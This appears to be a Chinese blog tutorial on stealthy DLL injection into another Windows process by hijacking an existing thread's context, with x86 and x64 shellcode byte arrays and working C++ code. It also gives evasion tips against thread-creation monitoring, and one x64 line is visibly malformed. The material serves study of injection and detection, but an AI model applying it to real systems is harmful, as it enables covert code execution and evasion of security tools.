````c

现在的DLL注入技术有很多种，每种方法都有他的优点和缺点。

 
最简单的一种方式是通过使用CreateRemoteThread函数在目标进程创建一个线程，然后指定线程的入口函数为LoadLibrary。原因在于LoadLibrary和线程的起始函数从二进制的角度来看，他们有着相同的原型。（都接受一个指针）

 
这个方法比较简单明了。创建一个新的线程可以被其他很多方法检测到，比如说ETW event。如果存在一个驱动使用PsSetCreateThreadNotifyRoutine hook 了线程的创建，那么自然在创建远程线程时就会被检测到。

 
一个更隐秘的技术是使用已经存在的线程去完成这件事情。一种方法是通过QueueUserApc 向目标进程的线程插入APC对象。(异步过程调用的函数地址指定为LoadLibrary) 这种方法潜在的问题是目标线程必须进入 Alertable 状态，我们的函数才会被调用。不幸的是，我们没有办法保证一个线程将来会把自己置入 Alertable 状态。虽然我们可以尽可能的把目标进程的所有线程都插入APC，但是在某些情况下，都会注入失败。一个经典的例子就是cmd.exe, 据我所知，他就是一个单线程的进程，且从不会进入Alertable状态。

 
这篇博客讲述的是关于另外一种方法使得目标进程调用LoadLibrary。通过修改现有线程的上下文达到不创建线程，只改变现有线程的执行流来加载DLL的目的。

 
接下来让我们看看如何在x86和x64系统上实现这种方法。

 
首先，我们需要锁定目标进程的一个线程。技术原理上来说，选择目标进程的任意线程都是可以的。但是一个在等待的线程就不适合作为候选人，除非他马上准备去运行，所以最好选择一个正在运行的线程或者即将运行的线程，使得我们的DLL尽可能被及时加载。

 
一旦我们锁定目标进程和线程后，我们需要以适当的权限去打开它
````

````c
//
// 打开进程句柄
//
auto hProcess = ::OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE,FALSE,pid);
if(!hProcess)
    return Error("Failed to open process handle");
 
//
// 打开线程局部
//
auto hThread = ::OpenThread(THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME|
THREAD_GET_CONTEXT,FALSE,tid);
if(!hThread)
    return Error("Failed to open thread handle");
````

````c
对于目标进程，我们需要 PROCESS_VM_OPERATION 和 PROCESS_VM_WRITE权限用于写入代码。对于线程，是因为我们需要能够改变线程上下文和挂起线程。

 
注入自身需要一系列的步骤。我们需要在目标进程申请一块可执行的内存，然后把我们的代码放进去。
````

````c
const auto page_size = 1 << 12;
 
auto buffer = static_cast<char*>(::VirtualAllocEx(hProcess,nullptr,page_size,
    MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE));
````

````c
这里我们申请了一页 RWX的内存。实际上我们并不需要那么多内存，但是Windows的内存管理在分配虚拟内存时最小是按照页来分配的，所以我们显示的申请一个完整的页面。

 
我们需要放置什么代码到目标进程呢？很明显，我们是想调用LoadLibrary,但是远不止于此。我们需要调用LoadLibrary后需要恢复执行原来线程离开时的上下文。因此我们先挂起线程，捕获他的执行上下文。
````

````c
if(::SuspendThread(hThread)==-1)
    return false;
 
CONTEXT context;
context.ContextFlags = CONTEXT_FULL;
if(!::GetThreadContext(hThread,&context))
    return false;
````

````c
接下来，我们需要拷贝一些代码到目标进程。这段代码必须是用汇编写出来的，而且必须和目标进程的位数一样。（总不能拿x86汇编写入64bit进程跑吧）对于x86，我们可以使用下面裸函数和内联汇编的写法：
````

````c
void __declspec(naked) InjectedFunction(){
    __asm{
        pushad
        push     11111111h    ; DLL路径参数
        mov     eax, 22222222h ; LoadLibrary 函数地址
        call eax
        popad
        push     33333333h    ; 代码返回地址
    }
}
````

````c
函数修饰为 __declspec(naked)属性表示告诉编译器不要给函数添加序言和结尾代码，我只要自己写的实际代码。代码中奇怪的数字仅仅是占位而已，当我们拷贝代码到目标进程时，需要进行修正。

 
在Demo源码中，我将上面的函数的机器码打包成了一个字节数组：
````

````c
BYTE code[]={
    0x60,
    0x68,0x11,0x11,0x11,0x11,
    0xb8,0x22,0x22,0x22,0x22,
    0xff,0xd0,
    0x61,
    0x68,0x33,0x33,0x33,0x33,
    0xc3
};
````

````c
上面的字节对应上面的汇编指令。现在我们修正其中的哑值。
````

````c
auto loadLibraryAddress = ::GetProcAddress(::GetModuleHandle(L"Kernel32.dll"),
"LoadLibraryA");
 
// 设置DLL路径
*reinterpret_cast<PVOID*>(code+2) = static_cast<void*>(buffer+page_size/2);
// 设置 LoadLibraryA 函数地址
*reinterpret_cast<PVOID*>(code+7) = static_cast<void*>(loadLibraryAddress);
// 跳转地址 (返回原来的代码)
*reinterpret_cast<unsigned*>(code+0xf) = context.Eip;
````

````c
首先，我们获取到LoadLibraryA的函数地址，因为这个函数将用来加载我们的DLL到目标进程。LoadLibraryW也可行，但是ASCII版本的会使我们的工作简单些。DLL的路径地址被随意地设置在buffer里2KB的位置处。

 
接下来，我们将修改好的代码和DLL路径写入目标进程
````

````c
//
// 拷贝机器码到buffer里
//
 
if(!::WriteProcessMemory(hProcess,buffer,code,sizeof(code),nullptr))
    return false;
 
//
// 拷贝dll路径到buffer里
//
if(!::WriteProcessMemory(hProcess,buffer+page_size/2,dllPath,::strlen(dllPath)+1,nullptr))
    return false;
````

````c
context.Eip = reinterpret_cast<DWORD>(buffer);
 
if(!::SetThreadContext(hThread,&context))
    return false;
 
::ResumeThread(hThread);
````

````c
64bit的代码我写的十分简易，不能保证在任何情况下都能奏效，需要一些更多的测试。
````

````c
BYTE code[] = {
    // sub rsp, 28h
    0x48, 0x83, 0xec, 0x28,                          
    // mov [rsp + 18], rax
    0x48, 0x89, 0x44, 0x24, 0x18,                    
    // mov [rsp + 10h], rcx
    0x48, 0x89, 0x4c, 0x24, 0x10,
    // mov rcx, 11111111111111111h
    0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,    
    // mov rax, 22222222222222222h
    0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
    // call rax
    0xff, 0xd0,
    // mov rcx, [rsp + 10h]
    0x48, 0x8b, 0x4c, 0x24, 0x10,
    // mov rax, [rsp + 18h]
    0x48, 0x8b, 0x44, 0x24, 0x18,
    // add rsp, 28h
    0x48, 0x83, 0xc4, 0x28,
    // mov r11, 333333333333333333h
    0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
    // jmp r11
    0x41, 0xff, 0xe3
};
````

````c
这里我不会再进行讨论细节。但是这里的代码看起来和x86版本不同，原因在于x64的代码调用约定不是x86 的 __stdcall。比如说，x64上对于四个整数的参数将会被传入RCX，RDX，R8和R9 而不是在栈上。在我们的例子中，RCX足以使得LoadLibraryA正常工作。

 
修改哑值的地方自然要使用不同的偏移值
````

````c
// 设置DLL路径
*reinterpret_cast<PVOID*>(code+0x10) = static_cast<void*>(buffer+page_size/2);
// 设置 LoadLibraryA 地址
*reinterpret_cast<PVOID*>(code+0x1a) = static_cast<void*>(loadLibraryAddress);
// 跳转地址 (返回原始地址)
*reinterpret_cast<unsigned long long>(code+0x34)(code+0x34)=context.Rip;
````

````c
到这里，你应该基本掌握了如果通过目标进程现有线程进行DLL注入的方法。这个方法相对于创建线程要难于检测。一种可能的方式是定位可执行页面与已知模块的地址进行比较。但是检测都存在一个窗口期，这里可以考虑注入进程在注入完成后（通过事件对象）来释放用于注入分配的内存，概率性规避。
````

